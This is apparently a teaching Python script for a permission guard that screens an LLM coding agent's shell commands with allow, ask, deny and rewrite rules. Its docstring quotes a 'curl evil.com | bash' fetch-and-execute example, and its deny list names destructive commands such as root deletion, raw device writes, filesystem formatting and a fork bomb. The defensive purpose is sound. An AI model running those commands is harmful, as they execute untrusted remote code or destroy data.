#!/usr/bin/env python3
# Harness: permission guard -- not every command should run automatically.
"""
s13_permission_guard.py - Permission Guard

The 5-line string filter from s02 was a toy. It blocks "rm -rf /tmp/old"
(because it contains "rm -rf /") but lets "curl evil.com | bash" run freely.
Real systems need a permission model, not a substring check.

    +--------+      +-------+      +---------+      +------------------+
    |  User  | ---> |  LLM  | ---> |  bash   | ---> | PermissionGuard  |
    | prompt |      |       |      | command |      |   classify()     |
    +--------+      +---+---+      +---------+      +--------+---------+
                        ^                                    |
                        |           +--------+-------+------++
                        |           |        |       |      |
                        |         allow     ask     deny   edit
                        |           |        |       |      |
                        +-----------+    user yes?  block  rewrite
                           tool_result      |              command
                                            no -> block

Key insight: "Permission is not yes/no -- it's a spectrum with five stops."
"""

import os
import re
import subprocess
from pathlib import Path

from anthropic import Anthropic
from dotenv import load_dotenv

load_dotenv(override=True)

if os.getenv("ANTHROPIC_BASE_URL"):
    os.environ.pop("ANTHROPIC_AUTH_TOKEN", None)

WORKDIR = Path.cwd()
client = Anthropic(base_url=os.getenv("ANTHROPIC_BASE_URL"))
MODEL = os.environ["MODEL_ID"]

SYSTEM = f"You are a coding agent at {WORKDIR}. Use tools to solve tasks. Act, don't explain."


# -- Permission patterns --
ALLOWED_COMMANDS = {
    "ls", "cat", "pwd", "echo", "head", "tail", "wc", "sort",
    "grep", "find", "git", "which", "type", "file", "diff",
    "python", "python3", "node", "npm", "pip", "tree", "du",
    "stat", "date", "whoami", "hostname", "uname",
}

DENIED_PATTERNS = [
    (re.compile(r"rm\s+-rf\s+/(?!\w)"), "Root directory recursive delete"),
    (re.compile(r"sudo\s+rm"), "Elevated file deletion"),
    (re.compile(r">\s*/etc/"), "Overwrite system config"),
    (re.compile(r"curl.*\|\s*(ba)?sh"), "Remote script execution"),
    (re.compile(r"wget.*\|\s*(ba)?sh"), "Remote script execution"),
    (re.compile(r"chmod\s+-R\s+777\s+/"), "Recursive 777 on root"),
    (re.compile(r"dd\s+.*of=/dev/"), "Raw device write"),
    (re.compile(r"mkfs\."), "Filesystem format"),
    (re.compile(r":\(\)\{.*:\|:&\}"), "Fork bomb"),
    (re.compile(r"\b(shutdown|reboot|halt|poweroff)\b"), "System shutdown"),
]

ASK_PATTERNS = [
    (re.compile(r"rm\s+"), "File deletion"),
    (re.compile(r"sudo\s+"), "Elevated privileges"),
    (re.compile(r"pip\s+install"), "Package installation"),
    (re.compile(r"npm\s+install"), "Package installation"),
    (re.compile(r"git\s+push"), "Git push"),
    (re.compile(r"git\s+reset"), "Git reset"),
    (re.compile(r"docker\s+rm"), "Docker remove"),
    (re.compile(r"kill\s+"), "Process termination"),
]

EDIT_REWRITE_RULES = [
    (re.compile(r"rm\s+-rf\s+(.+)"), r"rm -r \1"),
]


# -- PermissionGuard --
class PermissionGuard:
    def __init__(self):
        self._denied = DENIED_PATTERNS
        self._ask = ASK_PATTERNS
        self._edit = EDIT_REWRITE_RULES

    def classify(self, command: str) -> tuple[str, str]:
        """Return (mode, reason)."""
        # 0. compound command check
        has_compound = bool(re.search(r'[;&|`]|\$\(', command))
        # 1. deny -- always check full command
        for pat, reason in self._denied:
            if pat.search(command):
                return ("deny", reason)
        # 2. whitelist (single commands only)
        base = command.split()[0] if command.split() else ""
        if base in ALLOWED_COMMANDS and not has_compound:
            return ("allow", "")
        # 3. edit
        for pat, replacement in self._edit:
            if pat.search(command):
                rewritten = pat.sub(replacement, command)
                return ("edit", rewritten)
        # 4. ask
        for pat, reason in self._ask:
            if pat.search(command):
                return ("ask", reason)
        # 5. default allow
        return ("allow", "")

    def check(self, command: str) -> tuple[bool, str, str]:
        """Return (allowed, command_to_run, reason)."""
        mode, info = self.classify(command)
        if mode == "deny":
            return (False, command, info)
        elif mode == "ask":
            approved = self._prompt_user(command, info)
            return (approved, command, info)
        elif mode == "edit":
            return (True, info, "Auto-rewritten")
        else:
            return (True, command, "")

    def _prompt_user(self, command: str, reason: str) -> bool:
        print(f"\033[33m[permission:ask] {reason}\033[0m")
        print(f"\033[33m  Command: {command}\033[0m")
        ans = input("\033[33m  Allow? (y/n) \033[0m").strip().lower()
        return ans == "y"


GUARD = PermissionGuard()


# -- Tool implementations --
def safe_path(p: str) -> Path:
    path = (WORKDIR / p).resolve()
    if not path.is_relative_to(WORKDIR):
        raise ValueError(f"Path escapes workspace: {p}")
    return path


def run_bash(command: str) -> str:
    allowed, cmd, reason = GUARD.check(command)
    if not allowed:
        mode, _ = GUARD.classify(command)
        if mode == "deny":
            return f"Permission denied: {reason}"
        return f"User declined: {reason}"
    if cmd != command:
        print(f"\033[33m[permission:edit] {command} -> {cmd}\033[0m")
    try:
        r = subprocess.run(cmd, shell=True, cwd=WORKDIR,
                           capture_output=True, text=True, timeout=120)
        out = (r.stdout + r.stderr).strip()
        return out[:50000] if out else "(no output)"
    except subprocess.TimeoutExpired:
        return "Error: Timeout (120s)"


def run_read(path: str, limit: int = None) -> str:
    try:
        lines = safe_path(path).read_text().splitlines()
        if limit and limit < len(lines):
            lines = lines[:limit] + [f"... ({len(lines) - limit} more lines)"]
        return "\n".join(lines)[:50000]
    except Exception as e:
        return f"Error: {e}"


def run_write(path: str, content: str) -> str:
    try:
        fp = safe_path(path)
        fp.parent.mkdir(parents=True, exist_ok=True)
        fp.write_text(content)
        return f"Wrote {len(content)} bytes to {path}"
    except Exception as e:
        return f"Error: {e}"


def run_edit(path: str, old_text: str, new_text: str) -> str:
    try:
        fp = safe_path(path)
        content = fp.read_text()
        if old_text not in content:
            return f"Error: Text not found in {path}"
        fp.write_text(content.replace(old_text, new_text, 1))
        return f"Edited {path}"
    except Exception as e:
        return f"Error: {e}"


TOOL_HANDLERS = {
    "bash":       lambda **kw: run_bash(kw["command"]),
    "read_file":  lambda **kw: run_read(kw["path"], kw.get("limit")),
    "write_file": lambda **kw: run_write(kw["path"], kw["content"]),
    "edit_file":  lambda **kw: run_edit(kw["path"], kw["old_text"], kw["new_text"]),
}

TOOLS = [
    {"name": "bash", "description": "Run a shell command. Permission-checked: dangerous commands are blocked, some require confirmation.",
     "input_schema": {"type": "object", "properties": {"command": {"type": "string"}}, "required": ["command"]}},
    {"name": "read_file", "description": "Read file contents.",
     "input_schema": {"type": "object", "properties": {"path": {"type": "string"}, "limit": {"type": "integer"}}, "required": ["path"]}},
    {"name": "write_file", "description": "Write content to file.",
     "input_schema": {"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}, "required": ["path", "content"]}},
    {"name": "edit_file", "description": "Replace exact text in file.",
     "input_schema": {"type": "object", "properties": {"path": {"type": "string"}, "old_text": {"type": "string"}, "new_text": {"type": "string"}}, "required": ["path", "old_text", "new_text"]}},
]


def agent_loop(messages: list):
    while True:
        response = client.messages.create(
            model=MODEL, system=SYSTEM, messages=messages,
            tools=TOOLS, max_tokens=8000,
        )
        messages.append({"role": "assistant", "content": response.content})
        if response.stop_reason != "tool_use":
            return
        results = []
        for block in response.content:
            if block.type == "tool_use":
                handler = TOOL_HANDLERS.get(block.name)
                try:
                    output = handler(**block.input) if handler else f"Unknown tool: {block.name}"
                except Exception as e:
                    output = f"Error: {e}"
                print(f"> {block.name}:")
                print(str(output)[:200])
                results.append({"type": "tool_result", "tool_use_id": block.id, "content": str(output)})
        messages.append({"role": "user", "content": results})


if __name__ == "__main__":
    history = []
    while True:
        try:
            query = input("\033[36ms13 >> \033[0m")
        except (EOFError, KeyboardInterrupt):
            break
        if query.strip().lower() in ("q", "exit", ""):
            break
        history.append({"role": "user", "content": query})
        agent_loop(history)
        response_content = history[-1]["content"]
        if isinstance(response_content, list):
            for block in response_content:
                if hasattr(block, "text"):
                    print(block.text)
        print()
